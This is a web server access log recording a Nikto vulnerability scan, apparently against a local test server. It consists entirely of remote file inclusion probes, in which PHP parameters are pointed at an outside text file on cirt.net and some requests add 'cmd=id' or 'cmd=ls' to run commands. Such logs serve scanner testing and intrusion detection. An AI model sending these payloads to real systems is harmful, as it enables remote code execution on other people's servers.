172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /abf_js.php?abs_pfad=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004045)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /about.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 200 5309 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004046)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /about.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 200 5309 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004047)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /aboutinfo.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004048)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /acc.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004049)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /access/login.php?path_to_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004050)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /account.php?insPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004051)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /accsess/login.php?path_to_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004052)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /active/components/xmlrpc/client.php?c[components]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004053)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ad_main.php?_mygamefile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004054)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /add.cgi.php?blog_theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004055)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /add_link.php?blog_theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004056)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /addpost_newpoll.php?addpoll=preview&thispath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004057)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /addressbook.php?GLOBALS[basedir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004058)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /addsite.php?returnpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004059)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /addvip.php?msetstr[\\\"PROGSDIR\\\"]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004060)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adm/krgourl.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004061)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adm/my_statistics.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004062)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin.loudmouth.php?mainframe=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004063)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin.php?Madoa=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004064)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin.php?cal_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004065)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin.php?env_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004066)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004067)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004068)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin.php?submit=submit&form_include_template=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004069)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/PLUGINs/NP_UserSharing.php?DIR_ADMIN=http://cirt.net/rfiinc.txt??admin HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004070)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/ST_countries.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004071)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/ST_platforms.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004072)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/addentry.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004073)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/addentry.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004074)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/addons/archive/archive.php?adminfolder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004075)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/admin.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004076)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/admin.php?site_url=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004077)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/admin_forgotten_password.php?root_folder_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004078)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/admin_news_bot.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004079)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/admin_topic_action_logging.php?setmodules=attach&phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004080)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/admin_topic_action_logging.php?setmodules=pagestart&phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004081)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/admin_users.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004082)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/auth.php?xcart_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004083)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/auth.php?xcart_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004084)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/auth/secure.php?cfgProgDir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004085)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/autoprompter.php?CONFIG[BASE_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004086)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/bin/patch.php?INSTALL_FOLDER=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004087)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/catagory.php?language=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004088)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/OLE/PPS.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004089)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/OLE/PPS/File.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004090)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/OLE/PPS/Root.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004091)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/Spreadsheet/Excel/Writer.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004092)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/Spreadsheet/Excel/Writer/BIFFwriter.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004093)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/Spreadsheet/Excel/Writer/Format.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004094)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/Spreadsheet/Excel/Writer/Parser.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004095)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/Spreadsheet/Excel/Writer/Workbook.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004096)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/classes/pear/Spreadsheet/Excel/Writer/Worksheet.php?homedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004097)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/code/index.php?load_page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004098)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/comment.php?config[installdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004099)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/common-menu.php?CONF[local_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004100)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004101)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/config_settings.tpl.php?include_path=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004102)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/directory.php?config[installdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004103)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/doeditconfig.php?thispath=../includes&config[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004104)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/frontpage_right.php?loadadminpage=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004105)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/header.php?loc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004106)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/inc/add.php?format_menue=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004107)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/inc/change_action.php?format_menue=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004108)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/include/common.php?commonIncludePath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004109)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/include/header.php?repertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004110)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/include/header.php?repertoire=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004111)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/include/lib.module.php?mod_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004112)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/includes/admin_header.php?level=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004113)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/includes/admin_header.php?level=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004114)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/includes/author_panel_header.php?level=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004115)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/includes/author_panel_header.php?level=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004116)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/includes/header.php?bypass_installed=1&secure_page_path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 480 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004117)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/includes/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004118)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/index.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004119)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/index.php?pg=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004120)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/index.php?xtrphome=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004121)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/index_sitios.php?_VIEW=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004122)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/lib_action_step.php?GLOBALS[CLASS_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004123)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/login.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004124)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/news.admin.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004125)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/news.php?language=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004126)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/plugins/Online_Users/main.php?GLOBALS[PT_Config][dir][data]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004127)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/sendmsg.php?config[installdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004128)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/setup/level2.php?dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004129)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/system/config/conf-activation.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004130)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/system/include.php?skindir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004131)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/system/include.php?start=1&skindir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004132)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/system/menu/item.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004133)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/system/modules/conf_modules.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004134)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/templates/template_thumbnail.php?thumb_template=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004135)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/testing/tests/0004_init_urls.php?init_path=http://cirt.net/rfiinc.txt??& HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004136)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/themes.php?config[installdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004137)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/tools/utf8con2.1.5/index.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004138)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/tools/utf8conversion/index.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004138)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admin/user_user.php?language=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004139)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admincp/auth/checklogin.php?cfgProgDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004140)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admincp/auth/secure.php?cfgProgDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004141)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adminhead.php?path[docroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004142)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admini/admin.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004143)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /admini/index.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004144)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/admin.php?site_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004145)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004146)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004147)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004148)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004149)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 567 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004150)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 563 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004151)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 565 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004152)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 566 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004153)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004154)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 567 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004155)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 562 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004156)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004157)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004158)"
